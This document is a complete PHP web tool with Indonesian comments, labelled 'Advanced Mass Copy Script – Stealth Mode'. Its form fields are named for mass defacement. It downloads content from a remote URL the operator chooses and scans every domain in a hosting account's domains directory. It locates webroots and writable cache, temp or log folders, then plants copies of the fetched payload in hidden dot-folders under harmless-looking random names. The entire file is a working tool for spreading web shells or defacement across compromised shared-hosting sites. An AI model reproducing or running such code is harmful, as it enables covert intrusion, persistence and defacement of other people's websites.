<!DOCTYPE html>
<html>
<head>
    <title>Mass Copy Script - Advanced Stealth</title>
    <META NAME="robots" CONTENT="noindex,nofollow">
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; }
        .container { max-width: 950px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 12px; }
        input[type="text"], input[type="number"], select { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
        input[type="submit"] { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover { background: #45a049; }
        .log { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-left: 4px solid #4CAF50; margin: 10px 0; font-family: monospace; font-size: 13px; max-height: 500px; overflow-y: auto; }
        .success { color: #4CAF50; }
        .error { color: #f44336; }
        .info { color: #2196F3; }
        .warning { color: #FF9800; }
        .stats { background: #f0f0f0; padding: 10px; border-radius: 4px; margin: 10px 0; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 5px; }
        .badge { background: #2196F3; color: white; padding: 2px 8px; border-radius: 12px; font-size: 12px; }
        .domain-list { max-height: 200px; overflow-y: auto; background: #f8f8f8; padding: 10px; border-radius: 4px; margin: 5px 0; }
        .progress-bar { background: #f0f0f0; padding: 5px; border-radius: 4px; margin: 5px 0; }
        .progress-fill { background: #4CAF50; color: white; padding: 2px 5px; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <center><h1>Advanced Mass Copy Script</h1>
    <span class="badge">Stealth Mode v2.0</span></center>
    
    <?php
    // ============ FUNGSI UTAMA ============
    
    // Generate nama file random sesuai format yang dipilih
    function generateRandomFilename($format = 'php', $depth = 0) {
        $prefixes = ['backup', 'temp', 'cache', 'data', 'config', 'system', 'core', 'lib', 'module', 'plugin', 
                     'include', 'component', 'widget', 'block', 'element', 'helper', 'handler', 'processor',
                     'index', 'default', 'main', 'app', 'bootstrap', 'autoload', 'function', 'class'];
        
        // Format extensions yang valid
        $extensions = [
            'php' => ['php', 'inc', 'class', 'func', 'module'],
            'html' => ['html', 'htm', 'shtml'],
            'js' => ['js', 'min.js'],
            'css' => ['css', 'min.css'],
            'txt' => ['txt', 'log', 'md'],
            'asp' => ['asp', 'aspx'],
            'jsp' => ['jsp', 'jspx'],
            'py' => ['py', 'pyc'],
            'rb' => ['rb', 'rbw'],
            'pl' => ['pl', 'cgi']
        ];
        
        // Pilih extension sesuai format
        $extList = isset($extensions[$format]) ? $extensions[$format] : $extensions['php'];
        $suffix = $extList[array_rand($extList)];
        
        // Semakin dalam folder, semakin umum nama filenya
        if ($depth > 2) {
            $prefixes = array_merge($prefixes, ['index', 'default', 'main', 'app', 'bootstrap']);
        }
        
        $rand = rand(100, 999);
        $prefix = $prefixes[array_rand($prefixes)];
        
        return $prefix . '_' . $rand . '.' . $suffix;
    }

    // Generate nama folder random
    function generateRandomFolderName($depth = 0) {
        $folders = ['cache', 'temp', 'tmp', 'backup', 'logs', 'sessions', 'uploads', 'files', 'media', 
                    'assets', 'resources', 'storage', 'data', 'config', 'system', 'core', 'admin', 
                    'user', 'api', 'v1', 'v2', 'includes', 'classes', 'functions'];
        
        if ($depth > 1) {
            $folders = array_merge($folders, ['images', 'css', 'js', 'fonts', 'icons']);
        }
        
        return $folders[array_rand($folders)];
    }

    // SCAN ALL DOMAINS - Improved version
    function scanAllDomains($homePath) {
        $domains = [];
        $domainPath = rtrim($homePath, '/') . '/domains/';
        
        echo "🔍 Scanning: " . $domainPath . "<br>";
        
        if (!is_dir($domainPath)) {
            echo "<span class='error'>❌ Domains directory not found!</span><br>";
            return $domains;
        }
        
        $items = scandir($domainPath);
        $totalFound = 0;
        $totalPublicHtml = 0;
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $domainDir = $domainPath . $item;
            if (!is_dir($domainDir)) continue;
            
            $totalFound++;
            
            // Cari public_html atau webroot
            $webRoots = ['public_html', 'www', 'htdocs', 'html', 'public', 'web', 'site'];
            $foundWebRoot = false;
            
            foreach ($webRoots as $webRoot) {
                $testPath = $domainDir . '/' . $webRoot;
                if (is_dir($testPath) && is_readable($testPath)) {
                    $domains[] = [
                        'domain' => $item,
                        'path' => $testPath,
                        'webroot' => $webRoot
                    ];
                    $totalPublicHtml++;
                    $foundWebRoot = true;
                    break;
                }
            }
            
            // Jika tidak ada webroot, coba scan subfolder
            if (!$foundWebRoot) {
                $subItems = scandir($domainDir);
                foreach ($subItems as $subItem) {
                    if ($subItem == '.' || $subItem == '..') continue;
                    $subPath = $domainDir . '/' . $subItem;
                    if (is_dir($subPath)) {
                        foreach ($webRoots as $webRoot) {
                            $testPath = $subPath . '/' . $webRoot;
                            if (is_dir($testPath) && is_readable($testPath)) {
                                $domains[] = [
                                    'domain' => $item . '/' . $subItem,
                                    'path' => $testPath,
                                    'webroot' => $webRoot
                                ];
                                $totalPublicHtml++;
                                $foundWebRoot = true;
                                break 2;
                            }
                        }
                    }
                }
            }
        }
        
        echo "📊 Found <strong>" . $totalFound . "</strong> domains, <strong>" . $totalPublicHtml . "</strong> with webroot<br>";
        return $domains;
    }

    // Deteksi CMS
    function detectCMSStructure($basePath) {
        $cmsPatterns = [
            'wordpress' => ['wp-admin', 'wp-content', 'wp-includes'],
            'joomla' => ['administrator', 'components', 'modules', 'plugins'],
            'drupal' => ['sites', 'modules', 'themes', 'profiles'],
            'laravel' => ['app', 'bootstrap', 'config', 'resources'],
            'codeigniter' => ['application', 'system', 'assets'],
            'yii' => ['protected', 'assets', 'themes'],
            'symfony' => ['app', 'src', 'vendor', 'web'],
            'cakephp' => ['app', 'lib', 'plugins'],
            'zend' => ['module', 'vendor', 'public'],
            'magento' => ['app', 'skin', 'media', 'var'],
            'prestashop' => ['classes', 'controllers', 'modules', 'themes'],
            'opencart' => ['catalog', 'admin', 'system', 'extension'],
            'custom' => ['admin', 'includes', 'classes', 'functions']
        ];
        
        $detected = [];
        
        foreach ($cmsPatterns as $cms => $folders) {
            $found = 0;
            foreach ($folders as $folder) {
                if (is_dir($basePath . '/' . $folder)) {
                    $found++;
                }
            }
            if ($found >= 2) {
                $detected[] = [
                    'cms' => $cms,
                    'folders' => $folders,
                    'confidence' => ($found / count($folders)) * 100
                ];
            }
        }
        
        usort($detected, function($a, $b) {
            return $b['confidence'] - $a['confidence'];
        });
        
        return $detected;
    }

    // Cari lokasi stealth
    function findStealthLocations($basePath, $maxDepth = 4) {
        $locations = [];
        $priorityFolders = ['cache', 'temp', 'tmp', 'backup', 'logs', 'sessions', 'uploads'];
        $excludeFolders = ['.git', '.svn', '.env', 'node_modules', 'vendor'];
        
        $scanDir = function($dir, $depth) use (&$scanDir, &$locations, $maxDepth, $priorityFolders, $excludeFolders) {
            if ($depth > $maxDepth) return;
            
            $items = scandir($dir);
            if (!$items) return;
            
            $items = array_filter($items, function($item) use ($dir, $excludeFolders) {
                return $item != '.' && $item != '..' && 
                       !in_array($item, $excludeFolders) &&
                       is_dir($dir . '/' . $item) &&
                       is_readable($dir . '/' . $item);
            });
            
            // Prioritaskan folder penting
            usort($items, function($a, $b) use ($priorityFolders) {
                $aPriority = in_array($a, $priorityFolders) ? 1 : 0;
                $bPriority = in_array($b, $priorityFolders) ? 1 : 0;
                return $bPriority - $aPriority;
            });
            
            // Ambil maksimal 3 folder per depth untuk efisiensi
            $items = array_slice($items, 0, 3);
            
            foreach ($items as $item) {
                $fullPath = $dir . '/' . $item;
                
                if (is_writable($fullPath) && is_dir($fullPath)) {
                    $locations[] = [
                        'path' => $fullPath,
                        'depth' => $depth,
                        'name' => $item,
                        'is_priority' => in_array($item, $priorityFolders)
                    ];
                }
                
                if ($depth < $maxDepth - 1) {
                    $scanDir($fullPath, $depth + 1);
                }
            }
        };
        
        $scanDir($basePath, 0);
        
        // Sort by priority and depth
        usort($locations, function($a, $b) {
            if ($a['is_priority'] != $b['is_priority']) {
                return $b['is_priority'] - $a['is_priority'];
            }
            return $b['depth'] - $a['depth'];
        });
        
        return array_slice($locations, 0, 10); // Max 10 locations per domain
    }

    // ============ PROSES UTAMA ============
    
    if (isset($_POST['execmassdeface']) && isset($_POST['massdefaceurl'])) {
        $sourceUrl = $_POST['massdefaceurl'];
        $baseDir = $_POST['massdefacedir'];
        $maxDepth = isset($_POST['maxdepth']) ? intval($_POST['maxdepth']) : 4;
        $copyCount = isset($_POST['copycount']) ? intval($_POST['copycount']) : 2;
        $fileFormat = isset($_POST['fileformat']) ? $_POST['fileformat'] : 'php';
        $scanAll = isset($_POST['scanall']) ? true : false;
        
        $log = [];
        $successCount = 0;
        $failCount = 0;
        $filesCreated = [];
        $processedDomains = [];
        
        // Validasi source URL
        if (!filter_var($sourceUrl, FILTER_VALIDATE_URL)) {
            echo "<div class='log error'>Error: Invalid source URL!</div>";
            exit;
        }
        
        // Ambil content dari source URL
        $sourceContent = @file_get_contents($sourceUrl);
        if ($sourceContent === false) {
            echo "<div class='log error'>Error: Cannot fetch content from source URL!</div>";
            exit;
        }
        
        // Deteksi struktur
        $currentUser = get_current_user();
        $homePath = "/home/" . $currentUser . "/";
        
        echo "<div class='log'>";
        echo "<strong>🚀 Starting Advanced Stealth Copy v2.0...</strong><br>";
        echo "Source URL: " . htmlspecialchars($sourceUrl) . "<br>";
        echo "File Format: <strong>" . strtoupper($fileFormat) . "</strong> | Depth: " . $maxDepth . " | Copies: " . $copyCount . "<br><br>";
        
        // SCAN ALL DOMAINS
        $allDomains = scanAllDomains($homePath);
        
        if (empty($allDomains)) {
            echo "<span class='error'>❌ No domains found!</span><br>";
            echo "</div>";
            exit;
        }
        
        // Limit domains if not scan all
        if (!$scanAll) {
            $allDomains = array_slice($allDomains, 0, 10);
            echo "⚠️ Limited to first 10 domains (enable 'Scan All Domains' for more)<br><br>";
        } else {
            echo "✅ Scanning <strong>" . count($allDomains) . "</strong> domains...<br><br>";
        }
        
        $totalDomains = count($allDomains);
        $processed = 0;
        
        foreach ($allDomains as $domainInfo) {
            $domain = $domainInfo['domain'];
            $publicHtml = $domainInfo['path'];
            $webroot = $domainInfo['webroot'];
            
            $processed++;
            $processedDomains[] = $domain;
            
            echo "<strong>📁 [" . $processed . "/" . $totalDomains . "] Processing: " . htmlspecialchars($domain) . "</strong> (webroot: " . $webroot . ")<br>";
            
            // Deteksi CMS
            $cmsDetected = detectCMSStructure($publicHtml);
            if (!empty($cmsDetected)) {
                echo "🔍 CMS: " . $cmsDetected[0]['cms'] . " (" . round($cmsDetected[0]['confidence']) . "%)<br>";
            }
            
            // Cari lokasi stealth
            $locations = findStealthLocations($publicHtml, $maxDepth);
            
            if (empty($locations)) {
                echo "<span class='warning'>⚠️ No writable subdirectories found, using root...</span><br>";
                $locations = [['path' => $publicHtml, 'depth' => 0, 'name' => 'root', 'is_priority' => false]];
            }
            
            $domainSuccess = 0;
            $domainFail = 0;
            
            foreach ($locations as $location) {
                $targetPath = $location['path'];
                $depth = $location['depth'];
                
                // Buat hidden folder
                $hiddenFolderName = '.' . generateRandomFolderName($depth) . '_' . substr(md5(rand(1000,9999)), 0, 8);
                $hiddenFolder = $targetPath . '/' . $hiddenFolderName;
                
                for ($i = 0; $i < $copyCount; $i++) {
                    // Create nested structure
                    $nestedPath = $hiddenFolder;
                    $nestedDepth = rand(0, min(2, $maxDepth - $depth - 1));
                    
                    for ($j = 0; $j < $nestedDepth; $j++) {
                        $nestedFolder = generateRandomFolderName($depth + $j + 1);
                        $nestedPath .= '/' . $nestedFolder;
                    }
                    
                    // Create directory
                    if (!is_dir($nestedPath)) {
                        if (!mkdir($nestedPath, 0755, true)) {
                            $domainFail++;
                            $log[] = "<span class='error'>✗ Failed to create directory: " . $nestedPath . "</span>";
                            continue;
                        }
                    }
                    
                    // Generate filename sesuai format
                    $randomFile = generateRandomFilename($fileFormat, $depth + $i);
                    $newFile = $nestedPath . '/' . $randomFile;
                    
                    // Cek duplikat
                    if (file_exists($newFile)) {
                        $randomFile = 'copy_' . $randomFile;
                        $newFile = $nestedPath . '/' . $randomFile;
                    }
                    
                    // Copy file
                    if (file_put_contents($newFile, $sourceContent)) {
                        $successCount++;
                        $domainSuccess++;
                        $filesCreated[] = $newFile;
                        $log[] = "<span class='success'>✓ " . $newFile . "</span>";
                    } else {
                        $failCount++;
                        $domainFail++;
                        $log[] = "<span class='error'>✗ Failed: " . $newFile . "</span>";
                    }
                }
            }
            
            echo "📊 Results: <span class='success'>" . $domainSuccess . "</span> success, <span class='error'>" . $domainFail . "</span> failed<br><br>";
        }
        
        // ============ DISPLAY COMPLETE LOG ============
        echo "<hr>";
        echo "<strong>📋 Complete Summary:</strong><br>";
        echo "Total Domains Processed: " . count($processedDomains) . "<br>";
        echo "Total Files Created: <span class='success'>" . $successCount . "</span> | Failed: <span class='error'>" . $failCount . "</span><br>";
        echo "File Format: <strong>" . strtoupper($fileFormat) . "</strong><br><br>";
        
        echo "<strong>📂 Domains Processed:</strong><br>";
        foreach ($processedDomains as $d) {
            echo "• " . $d . "<br>";
        }
        echo "<br>";
        
        echo "<strong>📂 Files Created (" . count($filesCreated) . " files):</strong><br>";
        foreach ($filesCreated as $file) {
            echo "• " . $file . "<br>";
        }
        
        echo "</div>";
    }
    ?>
    
    <form action='<?php echo basename($_SERVER['PHP_SELF']); ?>' method='post'>
        <table width="100%">
            <tr>
                <td width="30%"><strong>Base Directory:</strong></td>
                <td><input type='text' style='width: 100%' value='<?php echo getcwd() . "/"; ?>' name='massdefacedir'></td>
            </tr>
            <tr>
                <td><strong>Source URL:</strong></td>
                <td><input type='text' style='width: 100%' name='massdefaceurl' placeholder='http://example.com/script.php'></td>
            </tr>
            <tr>
                <td><strong>File Format:</strong></td>
                <td>
                    <select name='fileformat' style='width: 100%'>
                        <option value='php'>PHP (.php, .inc, .class)</option>
                        <option value='html'>HTML (.html, .htm)</option>
                        <option value='js'>JavaScript (.js)</option>
                        <option value='css'>CSS (.css)</option>
                        <option value='txt'>Text (.txt, .log)</option>
                        <option value='asp'>ASP (.asp, .aspx)</option>
                        <option value='jsp'>JSP (.jsp)</option>
                        <option value='py'>Python (.py)</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td><strong>Scan Depth:</strong></td>
                <td><input type='number' style='width: 100%' name='maxdepth' value='4' min='1' max='8'></td>
            </tr>
            <tr>
                <td><strong>Copies per location:</strong></td>
                <td><input type='number' style='width: 100%' name='copycount' value='2' min='1' max='5'></td>
            </tr>
            <tr>
                <td><strong>Options:</strong></td>
                <td>
                    <label><input type='checkbox' name='scanall' value='1'> Scan All Domains (70+ domains)</label>
                </td>
            </tr>
            <tr>
                <td colspan="2" align="center">
                    <input type='submit' name='execmassdeface' value='🚀 Execute Stealth Copy'>
                </td>
            </tr>
        </table>
    </form>
    
    <div style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px;">
        <small>
            <strong>🔒 New Features v2.0:</strong><br>
            • <strong>File Format Selection</strong> - Pilih format output (PHP, HTML, JS, CSS, dll)<br>
            • <strong>Scan All Domains</strong> - Deteksi SEMUA domain (70+ domains)<br>
            • <strong>Better Domain Detection</strong> - Mencari public_html di semua struktur<br>
            • <strong>Multiple Extensions</strong> - Setiap format punya multiple extension<br>
            • <strong>Priority Folders</strong> - Prioritaskan cache, temp, logs, sessions<br>
            • <strong>Limit per Domain</strong> - Maksimal 10 lokasi per domain untuk efisiensi<br>
            • <strong>Complete Log</strong> - Menampilkan semua domain yang diproses<br>
            • <strong>Format Custom</strong> - Nama file menyesuaikan dengan format yang dipilih
        </small>
    </div>
</div>
</body>
</html>
